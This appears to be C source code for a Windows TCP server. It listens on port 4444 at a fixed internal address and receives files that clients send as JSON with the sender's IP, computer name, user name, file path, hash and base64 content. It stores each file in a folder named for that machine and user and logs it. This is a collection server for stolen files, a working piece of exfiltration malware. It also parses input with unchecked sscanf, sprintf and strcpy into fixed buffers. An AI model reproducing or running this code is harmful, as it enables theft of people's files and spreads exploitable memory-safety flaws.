#include "commun.h"



#define PORT 4444
#define BUFFER_SIZE 1024




BOOL HandleConnection(SOCKET clientSocket) {
    char buffer[BUFFER_SIZE];
    int bytesReceived = recv(clientSocket, buffer, BUFFER_SIZE - 1, 0);
    if (bytesReceived <= 0) {
        // Error receiving data or connection closed by client
        return FALSE;
    }
    buffer[bytesReceived] = '\0';

    char ip[16], computerName[MAX_PATH], userName[MAX_PATH];
    char filePath[MAX_PATH], fileHash[65], fileSize[16];
    char base64Content[BUFFER_SIZE]; // Adjust the size as needed

    // Extract information from JSON
    sscanf(buffer, "{\n \"ip\": \"%15[^\"]\",\n \"computerName\": \"%255[^\"]\",\n \"userName\": \"%255[^\"]\",\n \"filePath\": \"%255[^\"]\",\n \"fileHash\": \"%64[^\"]\",\n \"fileSize\": \"%15[^\"]\",\n \"content\": \"%[^\"]\" \n}", ip, computerName, userName, filePath, fileHash, fileSize, base64Content);

    // Calculate the decoded content size
    DWORD decodedContentSize;
    if (!CryptStringToBinaryA(base64Content, 0, CRYPT_STRING_BASE64, NULL, &decodedContentSize, NULL, NULL)) {
        // Error getting decoded content size
        return FALSE;
    }

    BYTE* decodedContent = (BYTE*)malloc(decodedContentSize);
    if (decodedContent == NULL) {
        // Memory allocation failed
        return FALSE;
    }

    if (!CryptStringToBinaryA(base64Content, 0, CRYPT_STRING_BASE64, decodedContent, &decodedContentSize, NULL, NULL)) {
        // Base64 decoding failed
        free(decodedContent);
        return FALSE;
    }

    // Create folder and file paths
    char folderName[1024];
    sprintf(folderName, "%s-%s-%s", ip, computerName, userName);
    CreateDirectoryA(folderName, NULL);
    char fileName[MAX_PATH];
    char* originalFileName = strrchr(filePath, '\\');
    originalFileName ? strcpy(fileName, originalFileName + 1) : strcpy(fileName, filePath);
    char fullFilePath[MAX_PATH];
    sprintf(fullFilePath, "%s\\%s", folderName, fileName);

    // Create and write the decoded content to the file
    FILE* file = fopen(fullFilePath, "wb");
    if (file) {
        fwrite(decodedContent, 1, decodedContentSize, file);
        fclose(file);
    }

    // Append to the log file
    char logFilePath[MAX_PATH];
    sprintf(logFilePath, "%s\\%s-%s-%s.log", folderName, ip, computerName, userName);
    FILE* logFile = fopen(logFilePath, "a");
    if (logFile) {
        fprintf(logFile, "%s,%s,%s\n", filePath, fileHash, fileSize);
        fclose(logFile);
    }

    free(decodedContent); // Free the allocated memory for decoded content

    send(clientSocket, "OK", 2, 0);

    return TRUE;
}



BOOL RunServer() {
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);

    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        printf("WSAStartup failed.\n");
        return 1;
    }

    SOCKET listenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (listenSocket == INVALID_SOCKET) {
        printf("Error creating socket.\n");
        WSACleanup();
        return 1;
    }

    struct sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(PORT);
    serverAddr.sin_addr.s_addr = inet_addr("192.168.48.157");

    if (bind(listenSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        printf("Bind failed.\n");
        closesocket(listenSocket);
        WSACleanup();
        return 1;
    }

    if (listen(listenSocket, 5) == SOCKET_ERROR) {
        printf("Listen failed.\n");
        closesocket(listenSocket);
        WSACleanup();
        return 1;
    }
    
    SetConsoleTextAttribute(hConsole, FOREGROUND_BLUE | FOREGROUND_INTENSITY);

    printf("\n\n[+] Server listening on port %d\n\n", PORT);

    SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE); // Reset to default color


    while (TRUE) {
        SOCKET clientSocket = accept(listenSocket, NULL, NULL);
        if (clientSocket == INVALID_SOCKET) {
            printf("Accept failed.\n");
            continue;
        }

        HandleConnection(clientSocket);
        closesocket(clientSocket);
    }

    closesocket(listenSocket);
    WSACleanup();
}